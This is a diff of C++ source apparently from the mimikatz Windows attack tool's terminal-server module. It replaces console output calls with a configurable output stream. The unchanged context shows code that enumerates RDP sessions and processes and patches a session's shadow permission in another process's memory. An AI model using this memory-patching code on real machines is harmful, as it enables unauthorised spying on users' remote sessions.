@@ -23,10 +23,10 @@ bool mod_mimikatz_terminalserver::sessions(vector<wstring> * arguments)
 
 	if(mod_ts::getSessions(&mesSessions, (arguments->size() ? &arguments->front() : NULL)))
 	{
-		wcout << L"SessId\tEtat\tstrEtat" << endl;
+		(*outputStream) << L"SessId\tEtat\tstrEtat" << endl;
 		for(vector<mod_ts::KIWI_WTS_SESSION_INFO>::iterator maSession = mesSessions.begin(); maSession != mesSessions.end(); maSession++)
 		{
-			wcout <<
+			(*outputStream) <<
 				setw(5) << setfill(wchar_t(' ')) << maSession->id << L'\t' <<
 				setw(5) << setfill(wchar_t(' ')) << maSession->state << L'\t' <<
 				setw(15) << setfill(wchar_t(' ')) << left << stateToType(maSession->state) << right << L'\t' <<
@@ -34,7 +34,7 @@ bool mod_mimikatz_terminalserver::sessions(vector<wstring> * arguments)
 				endl;
 		}
 	}
-	else wcout << L"mod_ts::getSessions : " << mod_system::getWinError() << endl;
+	else (*outputStream) << L"mod_ts::getSessions : " << mod_system::getWinError() << endl;
 	return true;
 }
 
@@ -45,10 +45,10 @@ bool mod_mimikatz_terminalserver::processes(vector<wstring> * arguments)
 
 	if(mod_ts::getProcesses(&mesProcess, (arguments->size() ? &arguments->front() : NULL)))
 	{
-		wcout << L"PID\tSessId\tUtilisateur" << endl;
+		(*outputStream) << L"PID\tSessId\tUtilisateur" << endl;
 		for(vector<mod_ts::KIWI_WTS_PROCESS_INFO>::iterator monProcess = mesProcess.begin(); monProcess != mesProcess.end(); monProcess++)
 		{
-			wcout << 
+			(*outputStream) << 
 				setw(5) << setfill(wchar_t(' ')) << monProcess->pid << L'\t' <<
 				setw(5) << setfill(wchar_t(' ')) << monProcess->sessionId << L'\t' <<
 				setw(48) << setfill(wchar_t(' ')) << left << monProcess->userSid << right << L'\t' << 
@@ -56,7 +56,7 @@ bool mod_mimikatz_terminalserver::processes(vector<wstring> * arguments)
 				endl;
 		}
 	}
-	else wcout << L"mod_ts::getSessions : " << mod_system::getWinError() << endl;
+	else (*outputStream) << L"mod_ts::getSessions : " << mod_system::getWinError() << endl;
 	return true;
 }
 
@@ -110,7 +110,7 @@ bool mod_mimikatz_terminalserver::modifyshadow(vector<wstring> * arguments)
 		if(!strError)
 			listAndOrModifySession(ptrSession, &newState);
 		else
-			wcout << L"Erreur de parsing de l\'argument : " << strState << endl;
+			(*outputStream) << L"Erreur de parsing de l\'argument : " << strState << endl;
 	}
 
 	return true;
@@ -175,38 +175,38 @@ bool mod_mimikatz_terminalserver::listAndOrModifySession(DWORD * id, DWORD * new
 									{
 										if((!id) || (maSession->id == *id))
 										{
-											wcout << L"@Winstation : " << addrWinstation << endl;
+											(*outputStream) << L"@Winstation : " << addrWinstation << endl;
 
-											wcout << L"\t" << maSession->prev << L" <-> " << maSession->next << endl;
-											wcout << L"\tid     : " << maSession->id << endl;
-											wcout << L"\tname   : " << maSession->name << endl;
-											wcout << L"\tsname  : " << maSession->sname << endl;
-											wcout << L"\ttype   : " << maSession->type << endl;
-											wcout << L"\tshadow : " << maSession->shadow << L" (" << shadowToType(maSession->shadow) << L")" << endl;
+											(*outputStream) << L"\t" << maSession->prev << L" <-> " << maSession->next << endl;
+											(*outputStream) << L"\tid     : " << maSession->id << endl;
+											(*outputStream) << L"\tname   : " << maSession->name << endl;
+											(*outputStream) << L"\tsname  : " << maSession->sname << endl;
+											(*outputStream) << L"\ttype   : " << maSession->type << endl;
+											(*outputStream) << L"\tshadow : " << maSession->shadow << L" (" << shadowToType(maSession->shadow) << L")" << endl;
 
 											if(newState)
 											{
 												reussite = mod_memory::writeMemory(addrWinstation + FIELD_OFFSET(KIWI_TS_SESSION, shadow), newState, sizeof(DWORD), processHandle);
-												wcout << L"\t      => " << *newState << L" (" <<shadowToType(*newState) << L") : " << (reussite ? L"OK" : L"KO") << endl;
+												(*outputStream) << L"\t      => " << *newState << L" (" <<shadowToType(*newState) << L") : " << (reussite ? L"OK" : L"KO") << endl;
 											}
-											wcout << endl;
+											(*outputStream) << endl;
 										}
 									}
 									delete maSession;
 								}
 							} while(addrWinstation != addrWinstationListHead);
 						}
-						else wcout << L"mod_memory::readMemory " << mod_system::getWinError() << endl;
+						else (*outputStream) << L"mod_memory::readMemory " << mod_system::getWinError() << endl;
 					}
-					else wcout << L"mod_memory::searchMemory " << mod_system::getWinError() << endl;
+					else (*outputStream) << L"mod_memory::searchMemory " << mod_system::getWinError() << endl;
 
 					CloseHandle(processHandle);
 				}
-				else wcout << L"OpenProcess " << mod_system::getWinError() << endl;
+				else (*outputStream) << L"OpenProcess " << mod_system::getWinError() << endl;
 			}
-			else wcout << L"mod_process::getUniqueModuleForName : " << mod_system::getWinError() << endl;
+			else (*outputStream) << L"mod_process::getUniqueModuleForName : " << mod_system::getWinError() << endl;
 		}
-		else wcout << L"mod_process::getUniqueServiceForName : " << mod_system::getWinError() << endl;
+		else (*outputStream) << L"mod_process::getUniqueServiceForName : " << mod_system::getWinError() << endl;
 	}
 	return reussite;
 }
